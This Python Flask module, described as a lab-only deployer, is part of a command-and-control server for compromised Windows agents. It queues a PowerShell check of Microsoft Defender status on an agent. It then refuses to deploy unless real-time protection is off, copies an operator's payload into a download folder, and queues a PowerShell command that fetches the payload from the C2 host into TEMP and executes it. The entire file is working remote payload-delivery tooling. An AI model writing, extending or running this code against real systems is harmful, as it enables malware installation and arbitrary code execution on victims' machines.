# deployer.py
# Lab-only deployer: Defender check + T1105 delivery to a specific agent.

import os
import shutil
import sys
import uuid

from flask import Blueprint, request, jsonify

deployer_bp = Blueprint('deployer_bp', __name__)

PAYLOAD_DIR = "generated_payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)


def _server_state():
    main_mod = sys.modules.get('__main__')
    if main_mod and hasattr(main_mod, 'agents'):
        return main_mod.agents, getattr(main_mod, 'killed_agents', set())
    return None, None


# ---------------- DEFENDER CHECK ----------------

DEFENDER_CHECK_CMD = (
    "$s = Get-MpComputerStatus; "
    "'AMServiceEnabled=' + $s.AMServiceEnabled + "
    "' RealTimeProtectionEnabled=' + $s.RealTimeProtectionEnabled + "
    "' AntivirusEnabled=' + $s.AntivirusEnabled + "
    "' BehaviorMonitorEnabled=' + $s.BehaviorMonitorEnabled + "
    "' TamperProtected=' + $s.IsTamperProtected"
)


@deployer_bp.route('/api/deployer/check-defender/<agent_id>', methods=['POST'])
def deployer_check_defender(agent_id):
    """
    Queue a Defender status check on the given agent.
    The result arrives via the normal /results path within ~8s.
    The frontend reads it back via /api/state and decides whether to allow deploy.
    """
    data = request.json or {}
    if not data.get("consent"):
        return jsonify({"error": "Consent required."}), 400

    agents, killed = _server_state()
    if agents is None:
        return jsonify({"error": "Server state unavailable."}), 500
    if agent_id in killed:
        return jsonify({"error": "Agent is terminated."}), 400
    if agent_id not in agents:
        return jsonify({"error": "Agent not connected."}), 404

    agents[agent_id]["queue"].append("T1562.001")
    agents[agent_id].setdefault("_deploy_overrides", {})["T1562.001"] = DEFENDER_CHECK_CMD

    print(f"[DEPLOYER] Queued Defender check on {agent_id}")
    return jsonify({
        "status": "queued",
        "agent_id": agent_id,
        "message": "Defender check queued. Wait ~8s, then click Step 2.",
        "check_technique": "T1562.001"
    })


# ---------------- DEPLOY (T1105) ----------------

@deployer_bp.route('/api/deployer/from-path', methods=['POST'])
def deployer_from_path():
    """
    Copy a payload from the operator's Kali filesystem into generated_payloads/
    and queue T1105 on the selected agent.

    Body: { src_path, agent_id, consent, defender_confirmed }
    """
    data = request.json or {}

    if not data.get("consent"):
        return jsonify({"error": "Consent required."}), 400

    if not data.get("defender_confirmed"):
        return jsonify({
            "error": "Defender status must be checked first (Step 1). "
                     "Deploy is blocked until Defender is verified as disabled."
        }), 400

    src_path = (data.get("src_path") or "").strip()
    agent_id = (data.get("agent_id") or "").strip()

    if not src_path:
        return jsonify({"error": "No source path provided."}), 400
    if not agent_id:
        return jsonify({"error": "No agent selected."}), 400

    agents, killed = _server_state()
    if agents is None:
        return jsonify({"error": "Server state unavailable."}), 500
    if agent_id in killed:
        return jsonify({"error": "Agent is terminated."}), 400
    if agent_id not in agents:
        return jsonify({"error": "Agent not connected."}), 404

    # ----- Verify Defender is OFF according to the last check -----
    last = agents[agent_id].get("_last_results", {})
    defender = last.get("T1562.001", "")

    if not defender:
        return jsonify({
            "error": "No Defender check result recorded for this agent. Run Step 1 first."
        }), 400

    if "RealTimeProtectionEnabled=True" in defender.replace(" ", ""):
        return jsonify({
            "error": "Defender Real-Time Protection is ON. Deployment blocked. "
                     "Disable Defender on the target before deploying."
        }), 409

    # ----- Path safety -----
    allowed_roots = [
        "/home/kali", "/root", "/tmp", "/home", "/mnt", "/media",
        os.path.expanduser("~"),
    ]
    abs_path = os.path.abspath(os.path.expanduser(src_path))

    allowed = False
    for root in allowed_roots:
        try:
            if os.path.commonpath([abs_path, os.path.abspath(root)]) == os.path.abspath(root):
                allowed = True
                break
        except ValueError:
            continue

    if not allowed:
        return jsonify({
            "error": "Path must be inside /home, /root, /tmp, /mnt, /media, or ~."
        }), 400

    if not os.path.exists(abs_path):
        return jsonify({"error": f"File does not exist: {abs_path}"}), 404

    if not os.path.isfile(abs_path):
        return jsonify({"error": "Path is not a regular file."}), 400

    if os.path.getsize(abs_path) > 100 * 1024 * 1024:
        return jsonify({"error": "File larger than 100 MB rejected."}), 400

    # ----- Copy into generated_payloads/ -----
    original_name = os.path.basename(abs_path)
    safe_name = "".join(c for c in original_name if c.isalnum() or c in "-_.") or "payload.bin"
    tag = str(uuid.uuid4())[:6]
    dst_name = f"{os.path.splitext(safe_name)[0]}_{tag}{os.path.splitext(safe_name)[1]}"
    dst_path = os.path.join(PAYLOAD_DIR, dst_name)

    try:
        shutil.copy2(abs_path, dst_path)
    except Exception as e:
        return jsonify({"error": f"Copy failed: {e}"}), 500

    # ----- Queue T1105 with the download URL -----
    download_url = f"http://__C2__/download/{dst_name}"
    cmd = (
        f"$url = '{download_url}'; "
        f"$out = \"$env:TEMP\\{dst_name}\"; "
        f"try {{ "
        f"  Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; "
        f"  Start-Process $out; "
        f"  'PAYLOAD_EXECUTED: {dst_name}' "
        f"}} catch {{ "
        f"  'PAYLOAD_BLOCKED: ' + $_.Exception.Message "
        f"}}"
    )

    agents[agent_id]["queue"].append("T1105")
    agents[agent_id].setdefault("_deploy_overrides", {})["T1105"] = cmd

    print(f"[DEPLOYER] {abs_path} -> {dst_path}")
    print(f"[DEPLOYER] Queued T1105 on {agent_id}")

    return jsonify({
        "status": "ok",
        "agent_id": agent_id,
        "source": abs_path,
        "stored_as": dst_name,
        "size": os.path.getsize(dst_path),
        "download_url": f"/download/{dst_name}",
        "message": "T1105 queued. Agent will download and execute on next beacon (~8s)."
    })


# ---------------- LIST PAYLOADS ----------------

@deployer_bp.route('/api/deployer/payloads')
def deployer_list_payloads():
    files = []
    if os.path.isdir(PAYLOAD_DIR):
        for f in os.listdir(PAYLOAD_DIR):
            p = os.path.join(PAYLOAD_DIR, f)
            if os.path.isfile(p):
                files.append({
                    "name": f,
                    "size": os.path.getsize(p),
                    "download_url": f"/download/{f}"
                })
    files.sort(key=lambda x: x["name"], reverse=True)
    return jsonify(files)
